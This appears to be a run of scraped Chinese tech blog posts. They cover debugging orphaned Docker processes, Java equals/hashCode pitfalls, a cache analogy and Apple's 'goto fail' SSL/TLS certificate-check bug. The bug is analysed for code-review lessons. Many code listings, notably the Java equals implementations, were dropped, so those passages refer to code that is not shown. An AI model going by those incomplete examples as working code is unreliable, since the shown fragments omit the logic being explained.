于是，我们的好奇心驱使我们继续调查。我让用户 `kubectl delete` 其中两个有问题的pod，因为本来就服务不断重启，所以，删掉也没有什么问题。删掉这两个pod后（一个是IP为 `10.233.14.145` 另一个是 `10.233.14.137`），我们发现，kubernetes在其它机器上重新启动了这两个服务的新的实例。然而， **在问题机器上，这两个IP地址居然还可以ping得通** 。好了，IP地址冲突的问题可以确认了。因为`10.233.14.xxx` 这个网段是 docker 的，所以，这个IP地址一定是在这台机器上。所以，我们想看看所有的 network namespace 下的 veth 网卡上的IP。在这个事上，我们费了点时间，因为对相关的命令也 很熟悉，所以花了点时间Google，以及看相关的man。* 首先，我们到 `/var/run/netns`目录下查看系统的network namespace，发现什么也没有。   * 然后，我们到 `/var/run/docker/netns` 目录下查看Docker的namespace，发现有好些。   * 于是，我们用指定位置的方式查看Docker的network namespace里的IP地址
这里要动用 `nsenter` 命令，这个命令可以进入到namespace里执行一些命令。比如$ nsenter --net=/var/run/docker/netns/421bdb2accf1 ifconfig -a上述的命令，到 `var/run/docker/netns/421bdb2accf1` 这个network namespace里执行了 `ifconfig -a` 命令。于是我们可以用下面 命令来遍历所有的network namespace。然后，我们发现了比较诡异的事情。* `10.233.14.145` 我们查到了这个IP，说明，docker的namespace下还有这个IP。   * `10.233.14.137`，这个IP没有在docker的network namespace下查到。有namespace leaking？于是我上网查了一下，发现了一个docker的bug – 在docker remove/stop 一个容器的时候，没有清除相应的network namespace，这个问题被报告到了 Issue#31597 然后被fix在了 PR#31996，并Merge到了 Docker的 17.05版中。而用户的版本是 17.09，应该包含了这个fix。不应该是这个问题，感觉又走不下去了。
不过， `10.233.14.137` 这个IP可以ping得通，说明这个IP一定被绑在某个网卡，而且被隐藏到了某个network namespace下。到这里，要查看所有network namespace，只有最后一条路了，那就是到 `/proc/` 目录下，把所有的pid下的 `/proc/<pid>/ns` 目录给穷举出来。好在这里有一个比较方便的命令可以干这个事 ： `lsns`于是我写下了如下的命令：$ lsns -t net | awk ‘{print $4}' | xargs -t -I {} nsenter -t {}&nbsp;-n ip addr | grep -C 4 "10.233.14.137"解释一下。* `lsns -t net` 列出所有开了network namespace的进程，其第4列是进程PID   * 把所有开过network namespace的进程PID拿出来，转给 `xargs` 命令   * 由 `xargs` 命令把这些PID 依次传给 `nsenter` 命令，      * `xargs -t` 的意思是会把相关的执行命令打出来，这样我知道是那个PID。     * `xargs -I {}` 是声明一个占位符来替换相关的PID
最后，我们发现，虽然在 `/var/run/docker/netns` 下没有找到 `10.233.14.137` ，但是在 `lsns` 中找到了三个进程，他们都用了`10.233.14.137` 这个IP（冲突了这么多）， **而且他们的MAC地址全是一样的！** （怪不得arping找不到）。通过`ps` 命令，可以查到这三个进程，有两个是java的，还有一个是`/pause` （这个应该是kubernetes的沙盒）。我们继续乘胜追击，穷追猛打，用`pstree`命令把整个进程树打出来。发现上述的三个进程的父进程都在多个同样叫 `docker-contiane` 的进程下！**这明显还是docker的，但是在`docker ps` 中却找不道相应的容器，什么鬼！快崩溃了……**继续看进程树，发现，这些 `docker-contiane` 的进程的父进程不在 `dockerd` 下面，而是在 `systemd` 这个超级父进程PID 1下，我靠！进而发现了一堆这样的野进程（这种野进程或是僵尸进程对系统是有害的，至少也是会让系统进入亚健康的状态，因为他们还在占着资源）。`docker-contiane` 应该是 `dockerd` 的子进程，被挂到了 `pid 1` 只有一个原因，那就是父进程“飞”掉了，只能找 pid 1 当养父。这说明，这台机器上出现了比较严重的 `dockerd` 进程退出的问题，而且是非常规的，因为 `systemd` 之所以要成为 pid 1，其就是要监管所有进程的子子孙孙，居然也没有管理好，说明是个非常规的问题。（注，关于 systemd，请参看《Linux PID 1 和 Systemd 》，关于父子进程的事，请参看《Unix高级环境编程》一书）
接下来就要看看 `systemd` 为 `dockerd` 记录的日志了…… （然而日志只有3天的了，这3天`dockerd`没有任何异常）#### 总结通过这个调查，可以总结一下，1） 对于问题调查，需要比较扎实的基础知识，知道问题的成因和范围。2）如果走不下去了，要重新梳理一下，回头仔细看一下一些蛛丝马迹，认真推敲每一个细节。3） 各种诊断工具要比较熟悉，这会让你事半功倍。4）系统维护和做清洁比较类似，需要经常看看系统中是否有一些僵尸进程或是一些垃圾东西，这些东西要及时清理掉。最后，多说一下，很多人都说， **Docker适合放在物理机内运行，这并不完全对，因为他们只考虑到了性能成本，没有考虑到运维成本，在这样512GB中启动几百个容器的玩法，其实并不好，因为这本质上是个大单体，因为你一理要重启某些关键进程或是机器，你的影响面是巨大的** 。———————— 更新 2018/12/10 —————————#### 问题原因这两天在自己的环境下测试了一下，发现，只要是通过 `systemctl start/stop docker` 这样的命令来启停 Docker， 是可以把所有的进程和资源全部干掉的。这个是没有什么问题的。我唯一能重现用户问题的的操作就是直接 `kill -9 <dockerd pid>` 但是这个事用户应该不会干。而 Docker 如果有 crash 事件时，Systemd 是可以通过 `journalctl -u docker` 这样的命令查看相关的系统日志的。
于是，我找用户了解一下他们在Docker在启停时的问题，用户说， **他们的执行`systemctl stop docker` 这个命令的时候，发现这个命令不响应了，有可能就直接按了 `Ctrl +C` 了**！这个应该就是导致大量的 `docker-containe` 进程挂到 `PID 1` 下的原因了。前面说过，用户的一台物理机上运行着上百个容器，所以，那个进程树也是非常庞大的，我想，停服的时候，系统一定是要遍历所有的docker子进程来一个一个发退出信号的，这个过程可能会非常的长。导致操作员以为命令假死，而直接按了 `Ctrl + C` ，最后导致很多容器进程并没有终止……#### 其它事宜有同学问，为什么我在这个文章里写的是 `docker-containe` 而不是 `containd` 进程？这是因为被 `pstree` 给截断了，用 `ps` 命令可以看全，只是进程名的名字有一个 `docker-`的前缀。下面是这两种不同安装包的进程树的差别（其中 `sleep` 是我用 `buybox` 镜像启动的）systemd───dockerd─┬─docker-contained─┬─3*[docker-contained-shim─┬─sleep]     │                 │                    └─9*[{docker-containe}]]     │                 ├─docker-contained-shim─┬─sleep     │                 │                 └─10*[{docker-containe}]     │                 └─14*[{docker-contained-shim}]     └─17*[{dockerd}]
systemd───dockerd─┬─containerd─┬─3*[containerd-shim─┬─sleep]     │            │                 └─9*[{containerd-shim}]     │            ├─2*[containerd-shim─┬─sleep]     │            │                    └─9*[{containerd-shim}]]     │            └─11*[{containerd}]     └─10*[{dockerd}]顺便说一下，自从 Docker 1.11版以后，Docker进程组模型就改成上面这个样子了.* `dockerd` 是 Docker Engine守护进程，直接面向操作用户。`dockerd` 启动时会启动 `containerd` 子进程，他们之前通过RPC进行通信。   * `containerd` 是`dockerd`和`runc`之间的一个中间交流组件。他与 `dockerd` 的解耦是为了让Docker变得更为的中立，而支持OCI 的标准 。   * `containerd-shim` 是用来真正运行的容器的，每启动一个容器都会起一个新的shim进程， 它主要通过指定的三个参数：容器id，boundle目录（containerd的对应某个容器生成的目录，一般位于：`/var/run/docker/libcontainerd/containerID`）， 和运行命令（默认为 `runc`）来创建一个容器。   * `docker-proxy` 你有可能还会在新版本的Docker中见到这个进程，这个进程是用户级的代理路由。只要你用 `ps -elf` 这样的命令把其命令行打出来，你就可以看到其就是做端口映射的。如果你不想要这个代理的话，你可以在 `dockerd` 启动命令行参数上加上： `--userland-proxy=false` 这个参数。
更多的细节，大家可以自行Google。这里推荐两篇文章：* Docker, Containerd & Standalone Runtimes — Here’s What You Should Know   * Docker components explained（全文完）# 编程语言流行度作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn下面是一个关于编程语言流行度的图（以前本站也有一篇编程语言流行度的文章）。其X轴是从Github中取来的数据（项目数），而Y轴是从StackOverflow取来的（tag数）。注意：Github提供了语言流行度：，而本图的原始数据在这里。编程语言流行度（点击看大图）来源：# 如何在Java中避免equals方法的隐藏陷阱作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn**译者注** :你可能会觉得Java很简单，Object的equals实现也会非常简单，但是事实并不是你想象的这样，耐心的读完本文，你会发现你对Java了解的是如此的少。如果这篇文章是一份Java程序员的入职笔试，那么不知道有多少人会掉落到这样的陷阱中。原文转自 三位作者都是不同领域的大拿，有兴趣的读者可以从上面这个连接直接去阅读原文。
**摘要**   本文描述重载equals方法的技术，这种技术即使是具现类的子类增加了字段也能保证equal语义的正确性。   在《Effective Java》的第8项中，Josh Bloch描述了当继承类作为面向对象语言中的等价关系的基础问题，要保证派生类的equal正确性语义所会面对的困难。Bloch这样写到：> **除非你忘记了面向对象抽象的好处，否则在当你继承一个新类或在类中增加了一个值组件时你无法同时保证equal的语义依然正确**在《Programming in Scala》中的第28章演示了一种方法，这种方法允许即使继承了新类，增加了新的值组件，equal的语义仍然能得到保证。虽然在这本书中这项技术是在使用Scala类环境中，但是这项技术同样可以应用于Java定义的类中。在本文中的描述来自于Programming in Scala中的文字描述，但是代码被我从scala翻译成了Java目录* 常见的等价方法陷阱   * 陷阱1：定义错误equals方法签名(signature)   * 陷阱2：重载了equals的但没有同时重载hashCode的方法   * 陷阱3：建立在会变化字段上的equals定义   * 陷阱4：不满足等价关系的equals错误定义   * canEqual 方法
#### 常见的等价方法陷阱java.lang.Object 类定义了equals这个方法，它的子类可以通过重载来覆盖它。不幸的是，在面向对象中写出正确的equals方法是非常困难的。事实上，在研究了大量的Java代码后，2007 paper的作者得出了如下的一个结论：> 几乎所有的equals方法的实现都是错误的！这个问题是因为等价是和很多其他的事物相关联。例如其中之一，一个的类型C的错误等价方法可能意味着你无法将这个类型C的对象可信赖的放入到容器中。比如说，你有两个元素elem1和elem2他们都是类型C的对象，并且他们是相等，即elem1.equals(elm2)返回ture。但是，只要这个equals方法是错误的实现，那么你就有可能会看见如下的一些行为：Set hashSet<C> = new java.util.HashSet<C>();     hashSet.add(elem1);     hashSet.contains(elem2);    // returns false!当equals重载时，这里有4个会引发equals行为不一致的常见陷阱：1. 定义了错误的equals方法签名(signature) Defining equals with the wrong signature.   2. 重载了equals的但没有同时重载hashCode的方法。 Changing equals without also changing hashCode.   3. 建立在会变化字域上的equals定义。 Defining equals in terms of mutable fields.   4. 不满足等价关系的equals错误定义 Failing to define equals as an equivalence relation.
在剩下的章节中我们将依次讨论这4中陷阱。#### 陷阱1：定义错误equals方法签名(signature)考虑为下面这个简单类Point增加一个等价性方法：private final int x;     private final int y;// ...     }看上去非常明显，但是按照这种方式来定义equals就是错误的。这个方法有什么问题呢？初看起来，它工作的非常完美：Point p1 = new Point(1, 2);     Point p2 = new Point(1, 2);Point q = new Point(2, 3);System.out.println(p1.equals(p2)); // prints trueSystem.out.println(p1.equals(q)); // prints false然而，当我们一旦把这个Point类的实例放入到一个容器中问题就出现了：import java.util.HashSet;HashSet<Point> coll = new HashSet<Point>();     coll.add(p1);System.out.println(coll.contains(p2)); // prints false
为什么coll中没有包含p2呢？甚至是p1也被加到集合里面，p1和p2是是等价的对象吗？在下面的程序中，我们可以找到其中的一些原因，定义p2a是一个指向p2的对象，但是p2a的类型是Object而非Point类型：Object p2a = p2;现在我们重复第一个比较，但是不再使用p2而是p2a,我们将会得到如下的结果：System.out.println(p1.equals(p2a)); // prints false到底是那里出了了问题？事实上，之前所给出的equals版本并没有覆盖Object类的equals方法，因为他的类型不同。下面是Object的equals方法的定义public boolean equals(Object other)因为Point类中的equals方法使用的是以Point类而非Object类做为参数，因此它并没有覆盖Object中的equals方法。而是一种变化了的重载。在Java中重载被解析为静态的参数类型而非运行期的类型，因此当静态参数类型是Point,Point的equals方法就被调用。然而当静态参数类型是Object时，Object类的equals就被调用。因为这个方法并没有被覆盖，因此它仍然是实现成比较对象标示。这就是为什么虽然p1和p2a具有同样的x,y值，”p1.equals(p2a)”仍然返回了false。这也是会什么HasSet的contains方法返回false的原因，因为这个方法操作的是泛型，他调用的是一般化的Object上equals方法而非Point类上变化了的重载方法equals
一个更好但不完美的equals方法定义如下：现在equals有了正确的类型，它使用了一个Object类型的参数和一个返回布尔型的结果。这个方法的实现使用instanceof操作和做了一个造型。它首先检查这个对象是否是一个Point类，如果是，他就比较两个点的坐标并返回结果，否则返回false。#### 陷阱2：重载了equals的但没有同时重载hashCode的方法如果你使用上一个定义的Point类进行p1和p2a的反复比较，你都会得到你预期的true的结果。但是如果你将这个类对象放入到HashSet.contains()方法中测试，你就有可能仍然得到false的结果：Point p1 = new Point(1, 2);     Point p2 = new Point(1, 2);HashSet<Point> coll = new HashSet<Point>();     coll.add(p1);System.out.println(coll.contains(p2)); // 打印 false (有可能)事实上，这个个结果不是100%的false，你也可能有返回ture的经历。如果你得到的结果是true的话，那么你试试其他的坐标值，最终你一定会得到一个在集合中不包含的结果。导致这个结果的原因是Point重载了equals却没有重载hashCode。   注意上面例子的的容器是一个HashSet，这就意味着容器中的元素根据他们的哈希码被被放入到”哈希桶 hash buckets”中。contains方法首先根据哈希码在哈希桶中查找，然后让桶中的所有元素和所给的参数进行比较。现在，虽然最后一个Point类的版本重定义了equals方法，但是它并没有同时重定义hashCode。因此，hashCode仍然是Object类的那个版本，即：所分配对象的一个地址的变换。所以p1和p2的哈希码理所当然的不同了，甚至是即时这两个点的坐标完全相同。不同的哈希码导致他们具有极高的可能性被放入到集合中不同的哈希桶中。contains方法将会去找p2的哈希码对应哈希桶中的匹配元素。但是大多数情况下，p1一定是在另外一个桶中，因此，p2永远找不到p1进行匹配。当然p2和p2也可能偶尔会被放入到一个桶中，在这种情况下，contains的结果就为true了。
最新一个Point类实现的问题是，它的实现违背了作为Object类的定义的hashCode的语义。> **   > 如果两个对象根据equals(Object)方法是相等的，那么在这两个对象上调用hashCode方法应该产生同样的值   >  **事实上，在Java中，hashCode和equals需要一起被重定义是众所周知的。此外，hashCode只可以依赖于equals依赖的域来产生值。对于Point这个类来说，下面的的hashCode定义是一个非常合适的定义。private final int x;     private final int y;}这只是hashCode一个可能的实现。x域加上常量41后的结果再乘与41并将结果在加上y域的值。这样做就可以以低成本的运行时间和低成本代码大小得到一个哈希码的合理的分布( **译者注：** 性价比相对较高的做法)。   增加hashCode方法重载修正了定义类似Point类等价性的问题。然而，关于类的等价性仍然有其他的问题点待发现。#### 陷阱3：建立在会变化字段上的equals定义让我们在Point类做一个非常微小的变化private int x;     private int y;
唯一的不同是x和y域不再是final，并且两个set方法被增加到类中来，并允许客户改变x和y的值。equals和hashCode这个方法的定义现在是基于在这两个会发生变化的域上，因此当他们的域的值改变时，结果也就跟着改变。因此一旦你将这个point对象放入到集合中你将会看到非常神奇的效果。Point p = new Point(1, 2);HashSet<Point> coll = new HashSet<Point>();     coll.add(p);System.out.println(coll.contains(p)); // 打印 true现在如果你改变p中的一个域，这个集合中还会包含point吗，我们将拭目以待。p.setX(p.getX() + 1);System.out.println(coll.contains(p)); // (有可能)打印 false看起来非常的奇怪。p去那里去了？如果你通过集合的迭代器来检查p是否包含，你将会得到更奇怪的结果。System.out.println(containedP); // 打印 true结果是，集合中不包含p，但是p在集合的元素中！到底发生了什么！当然，所有的这一切都是在x域的修改后才发生的，p最终的的hashCode是在集合coll错误的哈希桶中。即，原始哈希桶不再有其新值对应的哈希码。换句话说，p已经在集合coll的是视野范围之外，虽然他仍然属于coll的元素。
从这个例子所得到的教训是，当equals和hashCode依赖于会变化的状态时，那么就会给用户带来问题。如果这样的对象被放入到集合中，用户必须小心，不要修改这些这些对象所依赖的状态，这是一个小陷阱。如果你需要根据对象当前的状态进行比较的话，你应该不要再重定义equals，应该起其他的方法名字而不是equals。对于我们的Point类的最后的定义，我们最好省略掉hashCode的重载，并将比较的方法名命名为equalsContents，或其他不同于equals的名字。那么Point将会继承原来默认的equals和hashCode的实现，因此当我们修改了x域后p依然会呆在其原来在容器中应该在位置。#### 陷阱4：不满足等价关系的equals错误定义Object中的equals的规范阐述了equals方法必须实现在非null对象上的等价关系：* 自反原则：对于任何非null值X,表达式x.equals(x)总返回true。   * 等价性：对于任何非空值x和y，那么当且仅当y.equals(x)返回真时，x.equals(y)返回真。   * 传递性：对于任何非空值x,y,和z，如果x.equals(y)返回真，且y.equals(z)也返回真，那么x.equals(z)也应该返回真。   * 一致性：对于非空x,y，多次调用x.equals(y)应该一致的返回真或假。提供给equals方法比较使用的信息不应该包含改过的信息。   * 对于任何非空值x,x.equals(null)应该总返回false.
Point类的equals定义已经被开发成了足够满足equals规范的定义。然而，当考虑到继承的时候，事情就开始变得非常复杂起来。比如说有一个Point的子类ColoredPoint，它比Point多增加了一个类型是Color的color域。假设Color被定义为一个枚举类型：ColoredPoint重载了equals方法，并考虑到新加入color域，代码如下：private final Color color;这是很多程序员都有可能写成的代码。注意在本例中，类ColoredPointed不需要重载hashCode，因为新的ColoredPoint类上的equals定义，严格的重载了Point上equals的定义。hashCode的规范仍然是有效，如果两个着色点(colored point)相等，其坐标必定相等，因此它的hashCode也保证了具有同样的值。对于ColoredPoint类自身对象的比较是没有问题的，但是如果使用ColoredPoint和Point混合进行比较就要出现问题。Point p = new Point(1, 2);ColoredPoint cp = new ColoredPoint(1, 2, Color.RED);
System.out.println(p.equals(cp)); // 打印真 trueSystem.out.println(cp.equals(p)); // 打印假 false“p等价于cp”的比较这个调用的是定义在Point类上的equals方法。这个方法只考虑两个点的坐标。因此比较返回真。在另外一方面，“cp等价于p”的比较这个调用的是定义在ColoredPoint类上的equals方法，返回的结果却是false，这是因为p不是ColoredPoint，所以equals这个定义违背了对称性。违背对称性对于集合来说将导致不可以预期的后果，例如：Set<Point> hashSet1 = new java.util.HashSet<Point>();     hashSet1.add(p);     System.out.println(hashSet1.contains(cp));    // 打印 falseSet<Point> hashSet2 = new java.util.HashSet<Point>();     hashSet2.add(cp);     System.out.println(hashSet2.contains(p));    // 打印 true
因此虽然p和cp是等价的，但是contains测试中一个返回成功，另外一个却返回失败。   你如何修改equals的定义，才能使得这个方法满足对称性？本质上说有两种方法，你可以使得这种关系变得更一般化或更严格。更一般化的意思是这一对对象，a和b，被用于进行对比，无论是a比b还是b比a 都返回true，下面是代码：private final Color color;在ColoredPoint中的equals的新定义比老定义中检查了更多的情况:如果对象是一个Point对象而不是ColoredPoint，方法就转变为Point类的equals方法调用。这个所希望达到的效果就是equals的对称性，不管”cp.equals(p)”还是”p.equals(cp)”的结果都是true。然而这种方法，equals的规范还是被破坏了，现在的问题是这个新等价性不满足传递性。考虑下面的一段代码实例，定义了一个点和这个点上上两种不同颜色点：ColoredPoint redP = new ColoredPoint(1, 2, Color.RED);     ColoredPoint blueP = new ColoredPoint(1, 2, Color.BLUE);
redP等价于p，p等价于bluePSystem.out.println(redP.equals(p)); // prints trueSystem.out.println(p.equals(blueP)); // prints true然而，对比redP和blueP的结果是false:System.out.println(redP.equals(blueP)); // 打印 false因此，equals的传递性就被违背了。   使equals的关系更一般化似乎会将我们带入到死胡同。我们应该采用更严格化的方法。一种更严格化的equals方法是认为不同类的对象是不同的。这个可以通过修改Point类和ColoredPoint类的equals方法来达到。你能增加额外的比较来检查是否运行态的这个Point类和那个Point类是同一个类，就像如下所示的代码一样：private final int x;     private final int y;你现在可以将ColoredPoint类的equals实现用回刚才那个不满足对称性要的equals实现了。public class ColoredPoint extends Point { // 不再违反对称性需求
private final Color color;这里，Point类的实例只有当和另外一个对象是同样类，并且有同样的坐标时候，他们才被认为是相等的，即意味着 .getClass()返回的是同样的值。这个新定义的等价关系满足了对称性和传递性因为对于比较对象是不同的类时结果总是false。所以着色点(colored point)永远不会等于点(point)。通常这看起来非常合理，但是这里也存在着另外一种争论——这样的比较过于严格了。考虑我们如下这种稍微的迂回的方式来定义我们的坐标点(1,2)pAnon等于p吗？答案是假，因为p和pAnon的java.lang.Class对象不同。p是Point，而pAnon是Point的一个匿名派生类。但是，非常清晰的是pAnon的确是在坐标1，2上的另外一个点。所以将他们认为是不同的点是没有理由的。#### canEqual 方法到此，我们看其来似乎是遇到阻碍了，存在着一种正常的方式不仅可以在不同类继承层次上定义等价性，并且保证其等价的规范性吗？事实上，的确存在这样的一种方法，但是这就要求除了重定义equals和hashCode外还要另外的定义一个方法。基本思路就是在重载equals(和hashCode)的同时，它应该也要要明确的声明这个类的对象永远不等价于其他的实现了不同等价方法的超类的对象。为了达到这个目标，我们对每一个重载了equals的类新增一个方法canEqual方法。这个方法的方法签名是：
public boolean canEqual(Object other)如果other 对象是canEquals(重)定义那个类的实例时，那么这个方法应该返回真，否则返回false。这个方法由equals方法调用，并保证了两个对象是可以相互比较的。下面Point类的新的也是最终的实现：private final int x;     private final int y;}这个版本的Point类的equals方法中包含了一个额外的需求，通过canEquals方法来决定另外一个对象是否是是满足可以比较的对象。在Point中的canEqual宣称了所有的Point类实例都能被比较。下面是ColoredPoint相应的实现public class ColoredPoint extends Point { // 不再违背对称性private final Color color;在上显示的新版本的Point类和ColoredPoint类定义保证了等价的规范。等价是对称和可传递的。比较一个Point和ColoredPoint类总是返回false。因为点p和着色点cp,“p.equals(cp)返回的是假。并且，因为cp.canEqual(p)总返回false。相反的比较，cp.equals(p)同样也返回false，由于p不是一个ColoredPoint，所以在ColoredPoint的equals方法体内的第一个instanceof检查就失败了。
另外一个方面，不同的Point子类的实例却是可以比较的，同样没有重定义等价性方法的类也是可以比较的。对于这个新类的定义，p和pAnon的比较将总返回true。下面是一些例子：Point p = new Point(1, 2);ColoredPoint cp = new ColoredPoint(1, 2, Color.INDIGO);Set<Point> coll = new java.util.HashSet<Point>();     coll.add(p);System.out.println(coll.contains(p)); // 打印 trueSystem.out.println(coll.contains(cp)); // 打印 falseSystem.out.println(coll.contains(pAnon)); // 打印 true这些例子显示了如果父类在equals的实现定义并调用了canEquals，那么开发人员实现的子类就能决定这个子类是否可以和它父类的实例进行比较。例如ColoredPoint，因为它以”一个着色点永远不可以等于普通不带颜色的点重载了” canEqual，所以他们就不能比较。但是因为pAnon引用的匿名子类没有重载canEqual,因此它的实例就可以和Point的实例进行对比。
canEqual方法的一个潜在的争论是它是否违背了Liskov替换准则(LSP)。例如，通过比较运行态的类来实现的比较技术( **译者注：** canEqual的前一版本，使用.getClass()的那个版本)，将导致不能定义出一个子类，这个子类的实例可以和其父类进行比较，因此就违背了LSP。这是因为，LSP原则是这样的，在任何你能使用父类的地方你都可以使用子类去替换它。在之前例子中，虽然cp的x,y坐标匹配那些在集合中的点，然而”coll.contains(cp)”仍然返回false，这看起来似乎违背得了LSP准则，因为你不能这里能使用Point的地方使用一个ColoredPointed。但是我们认为这种解释是错误的，因为LSP原则并没有要求子类和父类的行为一致，而仅要求其行为能一种方式满足父类的规范。通过比较运行态的类来编写equals方法( **译者注：** canEqual的前一版本，使用.getClass()的那个版本)的问题并不是违背LSP准则的问题，但是它也没有为你指明一种创建派生类的实例能和父类实例进行对比的的方法。例如，我们使用这种运行态比较的技术在之前的”coll.contains(pAnon)”将会返回false，并且这并不是我们希望的。相反我们希望“coll.contains(cp)”返回false，因为通过在ColoredPoint中重载的equals，我基本上可以说，一个在坐标1，2上着色点和一个坐标1，2上的普通点并不是一回事。然而，在最后的例子中，我们能传递Point两种不同的子类实例到集合中contains方法，并且我们能得到两个不同的答案，并且这两个答案都正确。
**–全文完–**# 给老婆普及计算机知识作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn我们知道计算机的计算数据需要从磁盘调度到内存，然后再调度到L2 Cache，再到L1 Cache，最后进CPU寄存器进行计算。给老婆在电脑城买本本的时候向电脑推销人员问到这些参数，老婆听不懂，让我给她解释，解释完后，老婆说，“原来电脑内部这么麻烦，怪不得电脑总是那么慢，直接操作内存不就快啦”。我是那个汗啊。我只得向她解释，这样做是为了更快速的处理，她不解，于是我打了下面这个比喻——这就像我们喂宝宝吃奶一样，* CPU就像是已经在宝宝嘴里的奶一样，直接可以咽下去了。需要1秒钟* L1缓存就像是已冲好的放在奶瓶里的奶一样，只要把孩子抱起来才能喂到嘴里。需要5秒钟。* L2缓存就像是家里的奶粉一样，还需要先热水冲奶，然后把孩子抱起来喂进去。需要2分钟。* 内存RAM就像是各个超市里的奶粉一样，这些超市在城市的各个角落，有的远，有的近，你先要寻址，然后还要去商店上门才能得到。需要1-2小时。* 硬盘DISK就像是仓库，可能在很远的郊区甚至工厂仓库。需要大卡车走高速公路才能运到城市里。需要2-10天。
所以，在这样的情况下——* 我们不可能在家里不存放奶粉。试想如果得到孩子饿了，再去超市买，这不更慢吗？* 我们不可以把所有的奶粉都冲好放在奶瓶里，因为奶瓶不够。也不可能把超市里的奶粉都放到家里，因为房价太贵，这么大的房子不可能买得起。* 我们不可能把所有的仓库里的东西都放在超市里，因为这样干成本太大。而如果超市的货架上正好卖完了，就需要从库房甚至厂商工厂里调，这在计算里叫换页，相当的慢。我讲完后，老婆看似有些明白了，然后对我说，“明白了，我就说最近衣服有点跟不上，原来是L1（衣柜）里的衣服跟不上了，老公什么时候去买衣服啊……”。我晕！（以上故事，完全是我的亲身经历）# 游戏Flash vs HTML5作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn下面这个网页上做一个乒乓游戏，左边是Flash，右边是HTML5，很有趣。这也算是一个Flash和HTML5通讯的例子吧。# 由苹果的低级Bug想到的作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn2014年2月22日，在这个“这么二”的日子里，苹果公司推送了 iOS 7.0.6（版本号11B651）修复了 SSL 连接验证的一个 bug。官方网页在这里：，网页中如下描述：
> **Impact** : An attacker with a privileged network position may capture or > modify data in sessions protected by SSL/TLS > > **Description** : Secure Transport failed to validate the authenticity of > the connection. This issue was addressed by restoring missing validation > steps.也就是说，这个bug会引起中间人攻击，bug的描述中说，这个问题是因为miss了对连接认证的合法性检查的步骤。这里多说一句， **一旦网上发生任何的和SSL/TL相关的bug或安全问题，不管是做为用户，还是做为程序员的你，你一定要高度重视起来** 。因为这个网络通信的加密协议被广泛的应用在很多很多最最需要安全的地方，如果SSL/TLS有问题的话，意味着这个世界的计算机安全体系的崩溃。目录* Bug的代码原因   * 一些思考     * 0）关于编译报警     * 1）关于Code Merge 和 Code Review     * 2）关于测试     * 3）关于编码风格     * 4）关于goto语句   * 总结
#### Bug的代码原因Adam Langley的《Apple’s SSL/TLS bug 》的博文暴出了这个bug的细节。（在苹果的开源网站上，通过查看苹果的和SSL/TLS有关的代码变更，我们可以在文件sslKeyExchange.c中找到下面的代码）fail:     SSLFreeBuffer(&signedHashes);     SSLFreeBuffer(&hashCtx);     return err;     }注意，我高亮的地方，也就是那里有两个goto fail; 因为if语句没有加大括号，所以，只有第一个goto是属于if的，而第二个goto则是永远都会被执行到的（注：这里不是Python是C语言，缩进不代表这个语句属于同一个语句块）。也就是说，就算是前面的if检查都失败了（err == 0），也会goto fail。我们可以看到fail标签中释放完内存后就会return err;你想一下， **这段程序在SSLHashSHA1.update() 返回成功，也就是返回0 的时候会发生什么样的事？是的，真正干活的 sslRawVerify()被bypass了。而且这个函数SSLVerifySignedServerKeyExchange() 还返回了0，也就是成功了！** 尼玛！你可能想到酷壳网上之前《一个空格引发的惨剧》的文章。都是低级bug。
这个低级bug在这个周末在网上被炒翻了天，你可以 **上Twiter上看看#gotofail的标签的盛况** 。 **Goto Fail必然会成为历史上的一个经典事件** 。如果你喜欢XKCD，你一定会想到这个漫画：**注意** ：这个bug不会影响TLS 1.2版本，因为1.2版本不会用这个函数，走的是另一套机制。但是别忘了client端是可以选择版本的。如果你想测试一下你的浏览器是否会有问题， **你可以上一下当天就上线的 https://gotofail.com 网站**#### 一些思考下面是我对这个问题的一些思考。##### 0）关于编译报警有人在说苹果的这个代码中的goto语句会产生死代码——dead code，也就是永远都不会执行到的代码，C/C++的编程器是会报警的。但，实际上，dead code在默认上的不会报警的。即使你加上-Wall，GCC 4.8.2 或 Clang 3.3 都不会报警，包括Visual Studio 2012在默认的报警级别也不会（默认是/W3级，需要上升到/W4级以上，但是升级到/W4上，你的工程可能会有N多的Warning，你不一定能看得过来）。gcc和Clang有一个参数叫：-Wunreachable- code，是可以对这种情况报警的，但即没有被包括在- Wall里。原因是，这个参数有很多的问题，因为编译器的优化代码的行为，这个参数并不能对每种情况都准确地报告。另请注意，GCC的新版本中剔除了这个参数。当然，其它一些静态的代码检查工具也可以检查这个低级的问题。
另外，是不是用IDE的代码自动化格式工具也可以帮上一点忙呢？至少可以把那个缩进变成让人一看就觉得有问题。##### 1）关于Code Merge 和 Code Review你可以通过这里的代码比较看到这个bug的diff，也可以到这里看看（631行）。> diff -urN <(curl -s > http://opensource.apple.com/source/Security/Security-55179.13/libsecurity_ssl/lib/sslKeyExchange.c\?txt) > \ <(curl -s > http://opensource.apple.com/source/Security/Security-55471/libsecurity_ssl/lib/sslKeyExchange.c\?txt) > \通过code diff你可以看到， **苹果公司是在重构代码——为很多函数去掉了ctx的参数** 。所以，我们可以猜测，两个goto fail语句，可能是因为对code在不同branch上做merge发生的。版本工具merge代码的时候，经常性的会出现这样的问题。如果代码的diff很多，这个问题会很容易就没有注意到。就算有code review，这个有问题的代码也很难被找出来的。 **如果你来review下面的diff，你会注意到这个错误吗？**
